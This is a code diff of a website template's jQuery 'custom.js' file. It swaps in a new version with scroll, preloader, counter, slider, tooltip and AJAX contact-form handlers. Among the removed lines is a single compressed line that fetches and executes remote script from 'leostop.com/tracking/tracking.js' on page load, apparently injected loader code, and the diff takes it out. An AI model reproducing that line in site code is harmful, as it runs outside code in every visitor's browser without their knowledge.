@@ -1,128 +1,142 @@
-/**************************************
-    File Name: custom.js
-**************************************/
+/******************************************
+    Version: 1.0
+/****************************************** */
 
-(function ($) {
+(function($) {
     "use strict";
-    /**************************************
-    TOOLTIP
-    **************************************/
-    $(function () {
-        $('[data-toggle="tooltip"]').tooltip()
-    })
 
-    /**************************************
-    LOADER
-    **************************************/
-    $(window).load(function () {
-        $("#preloader").on(500).fadeOut();
-        $(".preloader").on(600).fadeOut("slow");
-    });
+    /* ==============================================
+    Fixed menu
+    =============================================== */
+    
+	$(window).on('scroll', function () {
+		if ($(window).scrollTop() > 50) {
+			//$('.top-navbar').addClass('fixed-menu');
+		} else {
+			//$('.top-navbar').removeClass('fixed-menu');
+		}
+	});
 
-    /**************************************
-    BACK TO TOP
-    **************************************/
-    jQuery(window).scroll(function () {
+    /* ==============================================
+    Back top
+    =============================================== */
+    jQuery(window).scroll(function() {
         if (jQuery(this).scrollTop() > 1) {
-            jQuery('.dmtop').css({ bottom: "25px" });
+            jQuery('.dmtop').css({
+                bottom: "10px"
+            });
         } else {
-            jQuery('.dmtop').css({ bottom: "-100px" });
+            jQuery('.dmtop').css({
+                bottom: "-100px"
+            });
         }
     });
-    jQuery('.dmtop').click(function () {
-        jQuery('html, body').animate({ scrollTop: '0px' }, 800);
-        return false;
-    });
 
-    /**************************************
-    COUNTER
-    **************************************/
+    /* ==============================================
+	Loader -->
+	=============================================== */
+	
+	$(window).load(function() {
+        $("#preloader").on(500).fadeOut();
+        $(".preloader").on(600).fadeOut("slow");
+		$('.loader-container').addClass('done');
+		$('.progress-br').addClass('done');	 
+    });
+	
+	/* ==============================================
+		Scroll to top  
+	============================================== */
+		
+	if ($('#scroll-to-top').length) {
+		var scrollTrigger = 100, // px
+			backToTop = function () {
+				var scrollTop = $(window).scrollTop();
+				if (scrollTop > scrollTrigger) {
+					$('#scroll-to-top').addClass('show');
+				} else {
+					$('#scroll-to-top').removeClass('show');
+				}
+			};
+		backToTop();
+		$(window).on('scroll', function () {
+			backToTop();
+		});
+		$('#scroll-to-top').on('click', function (e) {
+			e.preventDefault();
+			$('html,body').animate({
+				scrollTop: 0
+			}, 700);
+		});
+	}
+	
+    /* ==============================================
+     Fun Facts -->
+     =============================================== */
+
     function count($this) {
         var current = parseInt($this.html(), 10);
-        current = current + 1;
-
+        current = current + 50; /* Where 50 is increment */
         $this.html(++current);
         if (current > $this.data('count')) {
             $this.html($this.data('count'));
         } else {
-            setTimeout(function () { count($this) }, 50);
+            setTimeout(function() {
+                count($this)
+            }, 30);
         }
     }
-
-    $(".stat-timer").each(function () {
+    $(".stat_count, .stat_count_download").each(function() {
         $(this).data('count', parseInt($(this).html(), 10));
         $(this).html('0');
         count($(this));
     });
 
+	/* ==============================================
+     Bootstrap Touch Slider -->
+     =============================================== */
+	 
+	$('#carouselExampleControls').bsTouchSlider();
+	
+    /* ==============================================
+     Tooltip -->
+     =============================================== */
+    $('[data-toggle="tooltip"]').tooltip()
+    $('[data-toggle="popover"]').popover()
 
-    function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
-    /**************************************
-    CAROUSEL
-    **************************************/
-    $('.carousel').carousel({
-        interval: 3000
-    })
-})(jQuery);
-
-/**************************************
-TABBED
-**************************************/
-function openCategory(evt, catName) {
-    // Declare all variables
-    var i, tabcontent, tablinks;
-
-    // Get all elements with class="tabcontent" and hide them
-    tabcontent = document.getElementsByClassName("tabcontent");
-    for (i = 0; i < tabcontent.length; i++) {
-        tabcontent[i].style.display = "none";
-    }
-
-    // Get all elements with class="tablinks" and remove the class "active"
-    tablinks = document.getElementsByClassName("tablinks");
-    for (i = 0; i < tablinks.length; i++) {
-        tablinks[i].className = tablinks[i].className.replace(" active", "");
-    }
-
-    // Show the current tab, and add an "active" class to the link that opened the tab
-    document.getElementById(catName).style.display = "block";
-    evt.currentTarget.className += " active";
-}
-
-/**************************************
-lightbox popup
-**************************************/
-$(document).on('click', '[data-toggle="lightbox"]', function (event) {
-    event.preventDefault();
-    $(this).ekkoLightbox();
-});
-
-/**************************************
-portfolio
-**************************************/
-$(document).ready(function () {
-
-    $(".filter-button").click(function () {
-        var value = $(this).attr('data-filter');
-
-        if (value == "all") {
-            //$('.filter').removeClass('hidden');
-            $('.filter').show('1000');
-        }
-        else {
-            //            $('.filter[filter-item="'+value+'"]').removeClass('hidden');
-            //            $(".filter").not('.filter[filter-item="'+value+'"]').addClass('hidden');
-            $(".filter").not('.' + value).hide('3000');
-            $('.filter').filter('.' + value).show('3000');
-
-        }
+    /* ==============================================
+     Contact -->
+     =============================================== */
+    jQuery(document).ready(function() {
+        $('#contactform').submit(function() {
+            var action = $(this).attr('action');
+            $("#message").slideUp(750, function() {
+                $('#message').hide();
+                $('#submit')
+                    .after('<img src="images/ajax-loader.gif" class="loader" />')
+                    .attr('disabled', 'disabled');
+                $.post(action, {
+                        first_name: $('#first_name').val(),
+                        last_name: $('#last_name').val(),
+                        email: $('#email').val(),
+                        phone: $('#phone').val(),
+                        select_service: $('#select_service').val(),
+                        select_price: $('#select_price').val(),
+                        comments: $('#comments').val(),
+                        verify: $('#verify').val()
+                    },
+                    function(data) {
+                        document.getElementById('message').innerHTML = data;
+                        $('#message').slideDown('slow');
+                        $('#contactform img.loader').fadeOut('slow', function() {
+                            $(this).remove()
+                        });
+                        $('#submit').removeAttr('disabled');
+                        if (data.match('success') != null) $('#contactform').slideUp('slow');
+                    }
+                );
+            });
+            return false;
+        });
     });
-
-    if ($(".filter-button").removeClass("active")) {
-        $(this).removeClass("active");
-    }
-    $(this).addClass("active");
-
-});
-
-
+	
+})(jQuery);
